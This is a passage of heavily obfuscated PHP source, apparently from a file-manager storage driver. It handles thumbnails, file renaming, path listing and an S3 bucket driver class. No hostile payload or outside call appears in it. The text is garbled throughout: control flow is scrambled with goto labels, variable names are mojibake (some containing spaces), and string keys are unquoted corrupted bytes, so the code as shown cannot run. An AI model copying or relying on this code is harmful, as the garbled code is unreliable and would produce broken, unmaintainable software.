$c—ÇÛé†œ . $DØ ì—½‰Ä . $c¼‘óÖ¶ƒ[95] . $Aä§ò¼·å[$c¼‘óÖ¶ƒ[168]]; if (!@file_exists($CÜ¸»ëšŒâ)) { $CÜ¸»ëšŒâ = $this->download($A©‡¡èíğ°, $CÜ¸»ëšŒâ); } ImageThumb::createThumb($CÜ¸»ëšŒâ, $d†âÇÈÒ±…, $aİ„ó¸×Ä, $aİ„ó¸×Ä * 10); } if (!file_exists($d†âÇÈÒ±…) || filesize($d†âÇÈÒ±…) < 100) { return @file_exists($CÜ¸»ëšŒâ) ? IO::fileOut($CÜ¸»ëšŒâ) : $this->fileOut($A©‡¡èíğ°); } if (!($Aİ­÷ê™ªÉ = IO::move($d†âÇÈÒ±…, $fğÍ÷¢ƒƒ))) { return IO::fileOut($d†âÇÈÒ±…); } goto B¼íÇ•êŞÒ; CÒª‚«‘”Ì: if (isset($GLOBALS[$c¼‘óÖ¶ƒ[162]]) && $GLOBALS[$c¼‘óÖ¶ƒ[162]][$c¼‘óÖ¶ƒ[76]] == $Aä§ò¼·å[$c¼‘óÖ¶ƒ[76]]) { $eŒ‹…Ñºß‹ = $GLOBALS[$c¼‘óÖ¶ƒ[162]][$c¼‘óÖ¶ƒ[163]]; if (!$Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]]) { $Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]] = $GLOBALS[$c¼‘óÖ¶ƒ[162]]; } if (isset($eŒ‹…Ñºß‹[$c¼‘óÖ¶ƒ[165]])) { if ($eŒ‹…Ñºß‹[$c¼‘óÖ¶ƒ[165]] <= $aİ„ó¸×Ä && $eŒ‹…Ñºß‹[$c¼‘óÖ¶ƒ[166]] <= $aİ„ó¸×Ä) { $fÒëã«ÌÍÉ = !0; } } $aŞ¤¶¶êò = $Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]][$c¼‘óÖ¶ƒ[28]]; } if ($Aä§ò¼·å[$c¼‘óÖ¶ƒ[78]] <= 1024 * 50 || $fÒëã«ÌÍÉ || !function_exists($c¼‘óÖ¶ƒ[167]) || $Aä§ò¼·å[$c¼‘óÖ¶ƒ[168]] == $c¼‘óÖ¶ƒ[169]) { return $this->fileOut($A©‡¡èíğ°, !1, $aŞ¤¶¶êò); } if (isset($Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]][$c¼‘óÖ¶ƒ[170]])) { $DØ ì—½‰Ä = $Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]][$c¼‘óÖ¶ƒ[170]]; } else { if (isset($Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]][$c¼‘óÖ¶ƒ[171]])) { $DØ ì—½‰Ä = $Aä§ò¼·å[$c¼‘óÖ¶ƒ[164]][$c¼‘óÖ¶ƒ[171]]; } else { $DØ ì—½‰Ä = md5("{$Aä§ò¼·å[$c¼‘óÖ¶ƒ[28]]}\x5f{$Aä§ò¼·å[$c¼‘óÖ¶ƒ[76]]}\x5f{$Aä§ò¼·å[$c¼‘óÖ¶ƒ[78]]}"); } } goto Fˆäõ…Ê; C¸´ù› é¾: $c¼‘óÖ¶ƒ =& $_SERVER[›é¼±]; set_timeout(); if (substr($A©‡¡èíğ°, 0, 4) == $c¼‘óÖ¶ƒ[147]) { $this->fileOutLink($A©‡¡èíğ°); } goto Eä Ì ¶Õº; d÷èÂ¸òŠ: } public function fileOutImageServer($a†ªÈŒ—å, $b…ïĞÌ„ = 250) { $this->fileOutImage($a†ªÈŒ—å, $b…ïĞÌ„); } public function fileNameAuto($e•÷Ÿç‚¨¬, $FµÈòóáŠ—, $C¤Şˆ…¦µ = REPEAT_RENAME, $a¢ä÷Æ´à = false) { goto BñÁ¡±Å‡‘; D£Ú­ŸñÈá: while ($this->exist(rtrim($e•÷Ÿç‚¨¬, $dƒŸ³‹îÔ¡[8]) . $dƒŸ³‹îÔ¡[8] . $eÜÅã˜’„Š)) { $eÜÅã˜’„Š = $Cê¸”æªÄ . "\50{$Eˆ¸¢Ç‰øÚ}\51{$Eîí÷Š¦·}"; $Eˆ¸¢Ç‰øÚ++; } return $eÜÅã˜’„Š; goto fÆÎÕ›Ú; C¸ƒĞ×İ‡ô: if ($C¤Şˆ…¦µ == REPEAT_SKIP) { return !1; } $Eîí÷Š¦· = $dƒŸ³‹îÔ¡[95] . get_path_ext($FµÈòóáŠ—); $Eîí÷Š¦· = $Eîí÷Š¦· == $dƒŸ³‹îÔ¡[95] || $a¢ä÷Æ´à ? $dƒŸ³‹îÔ¡[33] : $Eîí÷Š¦·; goto aß¥Íí”¾°; BñÁ¡±Å‡‘: $dƒŸ³‹îÔ¡ =& $_SERVER[›é¼±]; $aí†‡¥Âòã = $e•÷Ÿç‚¨¬ === $dƒŸ³‹îÔ¡[33] ? $FµÈòóáŠ— : rtrim($e•÷Ÿç‚¨¬, $dƒŸ³‹îÔ¡[8]) . $dƒŸ³‹îÔ¡[8] . $FµÈòóáŠ—; if ($C¤Şˆ…¦µ == REPEAT_REPLACE || !$this->exist($aí†‡¥Âòã) || $a¢ä÷Æ´à && $C¤Şˆ…¦µ != REPEAT_RENAME_FOLDER) { return $FµÈòóáŠ—; } goto C¸ƒĞ×İ‡ô; aß¥Íí”¾°: $Eˆ¸¢Ç‰øÚ = 1; $Cê¸”æªÄ = substr($FµÈòóáŠ—, 0, strlen($FµÈòóáŠ—) - strlen($Eîí÷Š¦·)); $eÜÅã˜’„Š = $Cê¸”æªÄ . "\50{$Eˆ¸¢Ç‰øÚ}\51{$Eîí÷Š¦·}"; goto D£Ú­ŸñÈá; fÆÎÕ›Ú: } private function fileNameAutoList($Aôõº´‡å, $B‰‹Øï¹˜à, $f‘³ìÓ‘„Ê = false) { goto AÇ×Ï©ĞÏÂ; AÇ×Ï©ĞÏÂ: $Bµë£íë =& $_SERVER[›é¼±]; $bğôÄóµÇø = $this->listPath($Aôõº´‡å, !0); $bğôÄóµÇø = array_merge($bğôÄóµÇø[$Bµë£íë[75]], $bğôÄóµÇø[$Bµë£íë[74]]); goto fÀÑïŞ÷­ğ; D”¨×‹åŠ¶: $bÒéÌíÆ¹¦ = substr($B‰‹Øï¹˜à, 0, strlen($B‰‹Øï¹˜à) - strlen($b×©®Ìñ)); $B½äÓù”Ÿ = $bÒéÌíÆ¹¦ . "\50\x30\51{$b×©®Ìñ}"; for ($dâÊË‰‚‰– = 1; $dâÊË‰‚‰– <= count($Dæ§¹æÑù‘) + 1; $dâÊË‰‚‰–++) { $B½äÓù”Ÿ = $bÒéÌíÆ¹¦ . "\50{$dâÊË‰‚‰–}\51{$b×©®Ìñ}"; if (!in_array_not_case($B½äÓù”Ÿ, $Dæ§¹æÑù‘)) { return $B½äÓù”Ÿ; } } goto eÕÑ…—Ğîó; eÕÑ…—Ğîó: return $B½äÓù”Ÿ; goto D„—Áç¸ÅÄ; fÀÑïŞ÷­ğ: $Dæ§¹æÑù‘ = array_to_keyvalue($bğôÄóµÇø, $Bµë£íë[33], $Bµë£íë[28]); $b×©®Ìñ = $Bµë£íë[95] . get_path_ext($B‰‹Øï¹˜à); $b×©®Ìñ = $b×©®Ìñ == $Bµë£íë[95] || $f‘³ìÓ‘„Ê ? $Bµë£íë[33] : $b×©®Ìñ; goto D”¨×‹åŠ¶; D„—Áç¸ÅÄ: } public function listAllFiles($fåùŒŸïéë, $eï×‘ôĞ¾„, $F¢Í¬‹„ñ = array()) { goto b²ÏãÍãù¶; b²ÏãÍãù¶: $b’¾±½Àº =& $_SERVER[›é¼±]; if (empty($eï×‘ôĞ¾„)) { return array(); } $eñÃƒ“Ÿ“† = array(); goto F˜ŸµñÓªÍ; F˜ŸµñÓªÍ: $fåùŒŸïéë = trim($fåùŒŸïéë, $b’¾±½Àº[8]); foreach ($eï×‘ôĞ¾„ as $Dø±Ô½Èî¥) { $A§ŸÇ“˜ » = ltrim(substr(trim($Dø±Ô½Èî¥, $b’¾±½Àº[8]), strlen($fåùŒŸïéë)), $b’¾±½Àº[8]); $eñÃƒ“Ÿ“† = array_merge($eñÃƒ“Ÿ“†, $this->slicePath($A§ŸÇ“˜ »)); } $bÇØÊééÑÈ = array(); goto eìöğª¨‹š; eìöğª¨‹š: foreach (array_unique($eñÃƒ“Ÿ“†) as $Dø±Ô½Èî¥) { $f‰²æç¥æã = array($b’¾±½Àº[76] => $this->getPathOuter($b’¾±½Àº[8] . $fåùŒŸïéë . $b’¾±½Àº[8] . $Dø±Ô½Èî¥), $b’¾±½Àº[77] => 1, $b’¾±½Àº[78] => 0); if (substr($Dø±Ô½Èî¥, -1) != $b’¾±½Àº[8]) { $f‰²æç¥æã[$b’¾±½Àº[77]] = 0; $D“ù›áù = $this->getPath($fåùŒŸïéë . $b’¾±½Àº[8] . $Dø±Ô½Èî¥); $f‰²æç¥æã[$b’¾±½Àº[78]] = isset($F¢Í¬‹„ñ[$D“ù›áù]) ? $F¢Í¬‹„ñ[$D“ù›áù] : $this->size($D“ù›áù); } $bÇØÊééÑÈ[] = $f‰²æç¥æã; } return $bÇØÊééÑÈ; goto c•ƒ¿®ìŒ¨; c•ƒ¿®ìŒ¨: } public function slicePath($a¢çĞ½ÃË) { $bŠµƒŠñ±± =& $_SERVER[›é¼±]; $Fİ¥÷ŒñÃ— = explode($bŠµƒŠñ±±[8], trim($a¢çĞ½ÃË, $bŠµƒŠñ±±[8])); $cõ¡ÕÒ²ù¼ = 0; do { ++$cõ¡ÕÒ²ù¼; $dÓáÀ¡[] = implode($bŠµƒŠñ±±[8], array_slice($Fİ¥÷ŒñÃ—, 0, $cõ¡ÕÒ²ù¼)) . $bŠµƒŠñ±±[8]; } while ($cõ¡ÕÒ²ù¼ < count($Fİ¥÷ŒñÃ—)); $dÓáÀ¡[count($Fİ¥÷ŒñÃ—) - 1] = $a¢çĞ½ÃË; return $dÓáÀ¡; } public function getHost() { $CÏ„ó¾…» =& $_SERVER[›é¼±]; $Fòš¢ÊÁğ = parse_url(trim($this->domain, $CÏ„ó¾…»[8])); $DÎËö—£Ä = isset($Fòš¢ÊÁğ[$CÏ„ó¾…»[174]]) ? $Fòš¢ÊÁğ[$CÏ„ó¾…»[174]] : http_type(); $Aà°¿¥± = isset($Fòš¢ÊÁğ[$CÏ„ó¾…»[175]]) ? $Fòš¢ÊÁğ[$CÏ„ó¾…»[175]] : $Fòš¢ÊÁğ[$CÏ„ó¾…»[76]]; if (isset($Fòš¢ÊÁğ[$CÏ„ó¾…»[176]])) { $Aà°¿¥± .= $CÏ„ó¾…»[4] . $Fòš¢ÊÁğ[$CÏ„ó¾…»[176]]; } return $DÎËö—£Ä . $CÏ„ó¾…»[177] . $Aà°¿¥±; } public function pathEncode($B¾è…½ãËÓ) { $f±èšà÷… =& $_SERVER[›é¼±]; return str_replace($f±èšà÷…[178], $f±èšà÷…[8], rawurlencode($B¾è…½ãËÓ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($C „Ã­ÆÖ) { set_timeout(); require_once SDK_DIR . $_SERVER[›é¼±][179]; parent::__construct(); $this->_init($C „Ã­ÆÖ); } public function _init($AºÃõÎ…Ş†) { foreach ($AºÃõÎ…Ş† as $AîÍ¬‚ôˆ => $a“ƒ„¿æÛ) { if (isset($this->{$AîÍ¬‚ôˆ})) { $this->{$AîÍ¬‚ôˆ} = $a“ƒ„¿æÛ; } } $this->endpoint = $AºÃõÎ…Ş†[$_SERVER[›é¼±][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Fæø¤¦ÇŸá = "\x76\64") { $this->signVer = $Fæø¤¦ÇŸá; $this->client->setSignatureVersion($Fæø¤¦ÇŸá); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto d„óÁÁ—Ø; d„óÁÁ—Ø: $Cï²ÇáñÂ¾ =& $_SERVER[›é¼±]; $Dó¹ÆôÔÃ¦ = $this->getBucketCors(); if (!$Dó¹ÆôÔÃ¦ || !is_array($Dó¹ÆôÔÃ¦)) { return !1; } goto e¡±¿°ì; e¡±¿°ì: if ($Dó¹ÆôÔÃ¦[$Cï²ÇáñÂ¾[181]] != $Cï²ÇáñÂ¾[182] || $Dó¹ÆôÔÃ¦[$Cï²ÇáñÂ¾[183]] != $Cï²ÇáñÂ¾[182]) { return !1; } $AİŠÂÙºÍŠ = array_map($Cï²ÇáñÂ¾[184], $Dó¹ÆôÔÃ¦[$Cï²ÇáñÂ¾[185]]); if (!is_array($AİŠÂÙºÍŠ)) { $AİŠÂÙºÍŠ = array(); } goto a¢íğ‰Ãù; a¢íğ‰Ãù: $f¨ÔÂ¹Ùª = array($Cï²ÇáñÂ¾[186], $Cï²ÇáñÂ¾[187], $Cï²ÇáñÂ¾[188], $Cï²ÇáñÂ¾[189], $Cï²ÇáñÂ¾[190]); $AÃÉ²àƒŠ© = array_diff($f¨ÔÂ¹Ùª, $AİŠÂÙºÍŠ); return empty($AÃÉ²àƒŠ©); goto b÷öÖï„§; b÷öÖï„§: } public function mkfile($EçÙ‹ÚİÊ“, $fÉ»Ñ†ÊøÒ = '', $D—ñ¼èœ…¹ = REPEAT_RENAME) { $AÂÃğ‰ÍÆ„ = $this->setContent($EçÙ‹ÚİÊ“, $fÉ»Ñ†ÊøÒ); if ($AÂÃğ‰ÍÆ„ !== !1) { return $this->getPathOuter($EçÙ‹ÚİÊ“); } return !1; } public function mkdir($e¬ §Ÿğã, $eä¡•æ¢Ï = REPEAT_SKIP) { $Bƒ±Òô’«ï =& $_SERVER[›é¼±]; if (empty($e¬ §Ÿğã) && $e¬ §Ÿğã !== $Bƒ±Òô’«ï[191]) { return !1; } if ($this->_isFolder($e¬ §Ÿğã)) { return $this->getPathOuter($e¬ §Ÿğã); } $eµÆŒÖÓ = $this->setContent($e¬ §Ÿğã, $Bƒ±Òô’«ï[33], !0); if ($eµÆŒÖÓ !== !1) { return $this->getPathOuter($e¬ §Ÿğã); } return !1; } public function copyFile($Då‘–ÍëÒ™, $Bë±Ì…ÌÜ‹, $C–‚›ï²Å = array()) { $FŠÆãÁì =& $_SERVER[›é¼±]; $EÃ¿‹óôÔ½ = $this->objectMeta($Då‘–ÍëÒ™); if (!$EÃ¿‹óôÔ½) { return !1; } if ($EÃ¿‹óôÔ½[$FŠÆãÁì[78]] <= 1024 * 1024 * 200) { $E¦³½†ƒ¬Ø = $this->client->copyObject($this->bucket, $Då‘–ÍëÒ™, $this->bucket, $Bë±Ì…ÌÜ‹, $FŠÆãÁì[192], $C–‚›ï²Å); } else { $E¦³½†ƒ¬Ø = $this->client->multiCopyObject($this->bucket, $Då‘–ÍëÒ™, $this->bucket, $Bë±Ì…ÌÜ‹, $C–‚›ï²Å); } $E¦³½†ƒ¬Ø = $E¦³½†ƒ¬Ø ? $this->getPathOuter($Bë±Ì…ÌÜ‹) : !1; return $E¦³½†ƒ¬Ø; } public function moveFile($bİ£ÑÉù×², $D‰‰ˆ®‘èã) { if ($this->copyFile($bİ£ÑÉù×², $D‰‰ˆ®‘èã)) { $this->delFile($bİ£ÑÉù×²); return $this->getPathOuter($D‰‰ˆ®‘èã); } return !1; } public function delFile($f‚Úã¶•ô) { return $this->client->deleteObject($this->bucket, $f‚Úã¶•ô); } public function delFolder($B‚»ºÚˆƒ¶) { goto c”Òí¥’¼; c”Òí¥’¼: $EõÇè–Ê¹ =& $_SERVER[›é¼±]; if (!$this->exist($B‚»ºÚˆƒ¶)) { return !0; } $this->listItemCache = !1; goto d°Ñéë¬; d°Ñéë¬: $D‹ ÄÆ·òĞ = $this->fileList($B‚»ºÚˆƒ¶); $this->listItemCache = !0; $fĞƒ¶Øã†® = trim($B‚»ºÚˆƒ¶, $EõÇè–Ê¹[8]) . $EõÇè–Ê¹[8]; goto aÚ¶ò´İ¿Ò; aÚ¶ò´İ¿Ò: if (!empty($B‚»ºÚˆƒ¶) && $B‚»ºÚˆƒ¶ !== $EõÇè–Ê¹[191] && !in_array($fĞƒ¶Øã†®, $D‹ ÄÆ·òĞ[$EõÇè–Ê¹[75]])) { $D‹ ÄÆ·òĞ[$EõÇè–Ê¹[75]][] = $fĞƒ¶Øã†®; } $Bù­”ğÏ‡¥ = $this->delByBatch($D‹ ÄÆ·òĞ[$EõÇè–Ê¹[74]]); if (!$Bù­”ğÏ‡¥) { return !1; } goto FŞù†½Š½é; FŞù†½Š½é: $Bù­”ğÏ‡¥ = $this->delByBatch($D‹ ÄÆ·òĞ[$EõÇè–Ê¹[75]]); if (!$Bù­”ğÏ‡¥) { return !1; } return $this->delFile($fĞƒ¶Øã†®); goto AÈåéËÃ„; AÈåéËÃ„: } private function delByBatch($c¦­÷‚¸¶) { foreach (array_chunk($c¦­÷‚¸¶, 1000) as $CÙÅä—Äñ½) { $E¡Áï„¶®• = $this->client->deleteObjects($this->bucket, $CÙÅä—Äñ½); if (!$E¡Áï„¶®•) { return !1; } } return !0; } public function rename($d•Ú¦İ´Ê¨, $fÅ­ˆğ˜©) { return $this->renameObject($d•Ú¦İ´Ê¨, $fÅ­ˆğ˜©); } public function listPath($a¤á´Æ¯ô, $aØòâ™ìĞ¬ = false) { $aªã·½ =& $_SERVER[›é¼±]; $fï…Î¯óÜ¯ = $this->fileList($a¤á´Æ¯ô, $aªã·½[8], !0); foreach ($fï…Î¯óÜ¯[$aªã·½[75]] as $bŞçÇ­Ãã‚ => $Aéì†˜¯Óœ) { $fï…Î¯óÜ¯[$aªã·½[75]][$bŞçÇ­Ãã‚] = $this->folderInfo($Aéì†˜¯Óœ, $aØòâ™ìĞ¬); } foreach ($fï…Î¯óÜ¯[$aªã·½[74]] as $bŞçÇ­Ãã‚ => $Aéì†˜¯Óœ) { $fï…Î¯óÜ¯[$aªã·½[74]][$bŞçÇ­Ãã‚] = $this->fileInfo($Aéì†˜¯Óœ[$aªã·½[28]], $aØòâ™ìĞ¬, $Aéì†˜¯Óœ); } return $fï…Î¯óÜ¯; } private function fileInfo($Aøî¼ÎØ¦, $f²×Š¤ÁçÜ = false, $a…ò»øÏŒÖ = array()) { goto D­ÃÉÕøò; D­ÃÉÕøò: $d¤øá«¾Ş =& $_SERVER[›é¼±]; $F¬ë¹ˆŒ±Ï = array($d¤øá«¾Ş[28] => $this->pathThis($Aøî¼ÎØ¦), $d¤øá«¾Ş[76] => $this->getPathOuter($Aøî¼ÎØ¦), $d¤øá«¾Ş[29] => $d¤øá«¾Ş[193], $d¤øá«¾Ş[168] => $this->ext($Aøî¼ÎØ¦), $d¤øá«¾Ş[78] => isset($a…ò»øÏŒÖ[$d¤øá«¾Ş[78]]) ? $a…ò»øÏŒÖ[$d¤øá«¾Ş[78]] : 0); if ($f²×Š¤ÁçÜ) { return $F¬ë¹ˆŒ±Ï; } goto cÍ¥Ğ½Ë™; cÍ¥Ğ½Ë™: $F¬ë¹ˆŒ±Ï[$d¤øá«¾Ş[194]] = $F¬ë¹ˆŒ±Ï[$d¤øá«¾Ş[84]] = 0; $F¬ë¹ˆŒ±Ï[$d¤øá«¾Ş[195]] = $F¬ë¹ˆŒ±Ï[$d¤øá«¾Ş[196]] = !0; if (empty($a…ò»øÏŒÖ)) { $a…ò»øÏŒÖ = $this->objectMeta($Aøî¼ÎØ¦); if (!$a…ò»øÏŒÖ) { return $F¬ë¹ˆŒ±Ï; } } goto DİãŒ˜¡¤; DİãŒ˜¡¤: if (isset($a…ò»øÏŒÖ[$d¤øá«¾Ş[197]])) { $F¬ë¹ˆŒ±Ï[$d¤øá«¾Ş[84]] = $a…ò»øÏŒÖ[$d¤øá«¾Ş[197]]; } if (isset($a…ò»øÏŒÖ[$d¤øá«¾Ş[78]])) { $F¬ë¹ˆŒ±Ï[$d¤øá«¾Ş[78]] = $a…ò»øÏŒÖ[$d¤øá«¾Ş[78]]; } return $F¬ë¹ˆŒ±Ï; goto Eå‚ç¶â Æ; Eå‚ç¶â Æ: } private function folderInfo($bíã«°¥¶ğ, $EÈ´£áƒæ = false) { goto c¼¼àïñ¡‰; aç‚¨êßª‚: return $AÍîƒ˜£Ø; goto FÏ·ˆÁµÏ; c¼¼àïñ¡‰: $cæ÷¥Ğ‡Œ =& $_SERVER[›é¼±]; $AÍîƒ˜£Ø = array($cæ÷¥Ğ‡Œ[28] => $this->pathThis($bíã«°¥¶ğ), $cæ÷¥Ğ‡Œ[76] => $this->getPathOuter($cæ÷¥Ğ‡Œ[8] . $bíã«°¥¶ğ), $cæ÷¥Ğ‡Œ[29] => $cæ÷¥Ğ‡Œ[77]); if ($EÈ´£áƒæ) { return $AÍîƒ˜£Ø; } goto bÎó†øíÔ¤; cøÙê…µƒ: $bíã«°¥¶ğ = trim($bíã«°¥¶ğ, $cæ÷¥Ğ‡Œ[8]) . $cæ÷¥Ğ‡Œ[8]; $Då¼¤£×‡¸ = $this->objectMeta($bíã«°¥¶ğ); if (isset($Då¼¤£×‡¸[$cæ÷¥Ğ‡Œ[197]])) { $AÍîƒ˜£Ø[$cæ÷¥Ğ‡Œ[194]] = $Då¼¤£×‡¸[$cæ÷¥Ğ‡Œ[197]]; } goto aç‚¨êßª‚; bÎó†øíÔ¤: $AÍîƒ˜£Ø[$cæ÷¥Ğ‡Œ[194]] = $AÍîƒ˜£Ø[$cæ÷¥Ğ‡Œ[84]] = 0; $AÍîƒ˜£Ø[$cæ÷¥Ğ‡Œ[195]] = $AÍîƒ˜£Ø[$cæ÷¥Ğ‡Œ[196]] = !0; if ($bíã«°¥¶ğ == $cæ÷¥Ğ‡Œ[33]) { return $AÍîƒ˜£Ø; } goto cøÙê…µƒ; FÏ·ˆÁµÏ: } private function fileList($b±‘“ã©ÒÀ, $dƒ¥•·ø« = '', $d“Õ†½ = 0) { goto A×œĞ¸Í…ˆ; A³­öíŞÆà: foreach ($DùÖ‚ïëÕ¾[$bµ›¤ÙÇ¿†[198]] as $b¤§ã«œ­¢) { goto aß¿ƒÂÕÌÃ; A°³¤±‚ª¬: $fĞ½‰—Ï¦ = $F‘ÇñÎš‰¤ == 0 && substr($Aæ¾Î±­âæ, strlen($Aæ¾Î±­âæ) - 1, 1) == $bµ›¤ÙÇ¿†[8] ? !0 : !1; if ($fïÌ³É‡±¨) { $this->cacheMethod($bµ›¤ÙÇ¿†[199], $Aæ¾Î±­âæ, $fĞ½‰—Ï¦); $this->cacheMethod($bµ›¤ÙÇ¿†[200], $Aæ¾Î±­âæ, $b¤§ã«œ­¢); } if ($fĞ½‰—Ï¦) { $aøæˆ§Ùƒ [] = $Aæ¾Î±­âæ; continue; } goto C—·³Ë¶½ê; C—·³Ë¶½ê: $Aš¯¢—ò‘•[] = $d“Õ†½ ? $b¤§ã«œ­¢ : $Aæ¾Î±­âæ; goto aÕ—Ä©œ”; aß¿ƒÂÕÌÃ: $Aæ¾Î±­âæ = $b¤§ã«œ­¢[$bµ›¤ÙÇ¿†[28]]; if ($Aæ¾Î±­âæ == $e¡ŠŞ²Ö…ç) { continue; } $F‘ÇñÎš‰¤ = isset($b¤§ã«œ­¢[$bµ›¤ÙÇ¿†[78]]) ? $b¤§ã«œ­¢[$bµ›¤ÙÇ¿†[78]] : 0; goto A°³¤±‚ª¬; aÕ—Ä©œ”: } foreach ($DùÖ‚ïëÕ¾[$bµ›¤ÙÇ¿†[201]] as $b¤§ã«œ­¢) { $aøæˆ§Ùƒ [] = $b¤§ã«œ­¢[$bµ›¤ÙÇ¿†[28]]; if ($fïÌ³É‡±¨) { $this->cacheMethod($bµ›¤ÙÇ¿†[199], $b¤§ã«œ­¢[$bµ›¤ÙÇ¿†[28]], !0); } } if ($fïÌ³É‡±¨) { $this->cacheMethod($bµ›¤ÙÇ¿†[199], $b±‘“ã©ÒÀ, !0); } goto aÖ²‚ƒ·‘; aÖ²‚ƒ·‘: return array($bµ›¤ÙÇ¿†[75] => $aøæˆ§Ùƒ , $bµ›¤ÙÇ¿†[74] => $Aš¯¢—ò‘•); goto C¨¼¼µôßÀ; A×œĞ¸Í…ˆ: $bµ›¤ÙÇ¿† =& $_SERVER[›é¼±]; $e¡ŠŞ²Ö…ç = rtrim($b±‘“ã©ÒÀ, $bµ›¤ÙÇ¿†[8]) . $bµ›¤ÙÇ¿†[8]; $DùÖ‚ïëÕ¾ = $this->listObjs($e¡ŠŞ²Ö…ç, null, null, $dƒ¥•·ø«); goto AØÒóÔ”«; AØÒóÔ”«: if (!$DùÖ‚ïëÕ¾) { return array($bµ›¤ÙÇ¿†[75] => array(), $bµ›¤ÙÇ¿†[74] => array()); } $fïÌ³É‡±¨ = $this->listItemCache === !1 ? !1 : !0; $aøæˆ§Ùƒ  = $Aš¯¢—ò‘• = array(); goto A³­öíŞÆà; C¨¼¼µôßÀ: } private function listObjs($fÇ¸“Á­Ú”, $EÑ™ĞòÓ‰· = null, $A­ÚÏ¤äÌŸ = null, $BÎ‹¤¸²êî = null) { $B÷ é¼‚ =& $_SERVER[›é¼±]; $fÇ¸“Á­Ú” = trim($fÇ¸“Á­Ú”, $B÷ é¼‚[8]); $Ešƒ›Îàêæ = empty($fÇ¸“Á­Ú”) && $fÇ¸“Á­Ú” !== $B÷ é¼‚[191] ? $B÷ é¼‚[33] : $fÇ¸“Á­Ú” . $B÷ é¼‚[8]; return $this->client->getBucket($this->bucket, $Ešƒ›Îàêæ, $EÑ™ĞòÓ‰·, $A­ÚÏ¤äÌŸ, $BÎ‹¤¸²êî, !0); } public function has($Cê©ÇÄô‹É, $b”ã®‡’œÜ = false, $e÷’‚ãÂ¸º = true) { goto a†ƒÍ£ÓÒ; aŸÊ‡‰·È¬: $FçøÀîôŠ = null; $cÂâÊù™Îµ = 500; $E¿ÑÌÌÏªã = $Aã–Îå‰[8]; goto Eƒ¥¿¶Ïè; bé¸÷–²‘Ğ: return !1; goto CìåÅã‰ãÙ; a†ƒÍ£ÓÒ: $Aã–Îå‰ =& $_SERVER[›é¼±]; $Cê©ÇÄô‹É = trim($Cê©ÇÄô‹É, $Aã–Îå‰[8]); $f™ÉÓ’Š– = empty($Cê©ÇÄô‹É) && $Cê©ÇÄô‹É !== $Aã–Îå‰[191] ? $Aã–Îå‰[33] : $Cê©ÇÄô‹É . $Aã–Îå‰[8]; goto aŸÊ‡‰·È¬; Eƒ¥¿¶Ïè: $dâˆ†äÊ»± = $c¢„÷ÌÑ…á = array(); while (!0) { $dğË••Ğ¥¥ = $this->listObjs($Cê©ÇÄô‹É, $FçøÀîôŠ, $cÂâÊù™Îµ, $E¿ÑÌÌÏªã); if (!$dğË••Ğ¥¥) { break; } $FçøÀîôŠ = $dğË••Ğ¥¥[$Aã–Îå‰[202]]; $F“·ö¬ô· = $dğË••Ğ¥¥[$Aã–Îå‰[198]]; $C¾Æ…µÌË = $dğË••Ğ¥¥[$Aã–Îå‰[201]]; if (empty($F“·ö¬ô·) && empty($C¾Æ…µÌË)) { break; } if (count($F“·ö¬ô·) == 1 && $F“·ö¬ô·[0][$Aã–Îå‰[28]] == $f™ÉÓ’Š–) { break; } if ($b”ã®‡’œÜ) { if (count($F“·ö¬ô·)) { $F“·ö¬ô· = array_column($F“·ö¬ô·, $Aã–Îå‰[28]); $dâˆ†äÊ»± = array_merge($dâˆ†äÊ»±, $F“·ö¬ô·); } if (count($C¾Æ…µÌË)) { $C¾Æ…µÌË = array_column($C¾Æ…µÌË, $Aã–Îå‰[28]); $c¢„÷ÌÑ…á = array_merge($c¢„÷ÌÑ…á, $C¾Æ…µÌË); } if ($FçøÀîôŠ === null) { break; } continue; } if ($e÷’‚ãÂ¸º) { if (!empty($F“·ö¬ô·)) { if (count($F“·ö¬ô·) > 1 || isset($F“·ö¬ô·[0][$Aã–Îå‰[28]]) && $F“·ö¬ô·[0][$Aã–Îå‰[28]] != $f™ÉÓ’Š–) { return !0; } } } else { if (!empty($C¾Æ…µÌË)) { return !0; } } if ($FçøÀîôŠ === null) { break; } } if ($b”ã®‡’œÜ) { $dâˆ†äÊ»± = array_diff($dâˆ†äÊ»±, array($f™ÉÓ’Š–)); $dâˆ†äÊ»± = count(array_unique($dâˆ†äÊ»±)); $c¢„÷ÌÑ…á = count(array_unique($c¢„÷ÌÑ…á)); return array($Aã–Îå‰[203] => $dâˆ†äÊ»±, $Aã–Îå‰[204] => $c¢„÷ÌÑ…á); } goto bé¸÷–²‘Ğ; CìåÅã‰ãÙ: } public function listAll($dÄò“¾»ÎÃ) { $f«¶«ô¶® =& $_SERVER[›é¼±]; $C§Å›Ù‘±ë = $this->fileList($dÄò“¾»ÎÃ, $f«¶«ô¶®[33], !0); $AâéÂÂˆî“ = array(); foreach ($C§Å›Ù‘±ë[$f«¶«ô¶®[74]] as $eÍõ¬ğ‹Şõ) { $AâéÂÂˆî“[$eÍõ¬ğ‹Şõ[$f«¶«ô¶®[28]]] = $eÍõ¬ğ‹Şõ[$f«¶«ô¶®[78]]; } foreach ($C§Å›Ù‘±ë[$f«¶«ô¶®[75]] as $eÍõ¬ğ‹Şõ) { if (is_string($eÍõ¬ğ‹Şõ)) { $AâéÂÂˆî“[$eÍõ¬ğ‹Şõ] = 0; } } return $this->listAllFiles($dÄò“¾»ÎÃ, array_keys($AâéÂÂˆî“), $AâéÂÂˆî“); } public function canRead($EíÉíïŒŒ’) { $E™Ë¥½…Ê£ =& $_SERVER[›é¼±]; $CÈ©Ì¶¯¤â = $this->client->getAccessControlPolicy($this->bucket, $EíÉíïŒŒ’); if (!$CÈ©Ì¶¯¤â) { return !1; } return in_array($CÈ©Ì¶¯¤â, 